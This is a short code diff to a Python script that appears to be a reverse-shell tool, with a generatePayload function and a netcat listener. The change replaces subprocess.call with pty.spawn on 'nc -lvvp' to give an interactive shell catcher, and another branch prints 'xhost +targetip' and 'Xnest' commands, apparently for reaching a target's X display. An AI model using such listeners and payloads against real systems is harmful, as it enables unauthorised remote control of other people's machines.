@@ -2,8 +2,8 @@
 
 import socket
 import sys
-import subprocess
 import util
+import pty
 
 def generatePayload(type, local_address, port):
 
@@ -61,4 +61,4 @@ if __name__ == "__main__":
         print("xhost +targetip")
         print("Xnest :1")
     else:
-        subprocess.call(["nc", "-lvvp", str(listen_port)])
+        pty.spawn(["nc", "-lvvp", str(listen_port)])
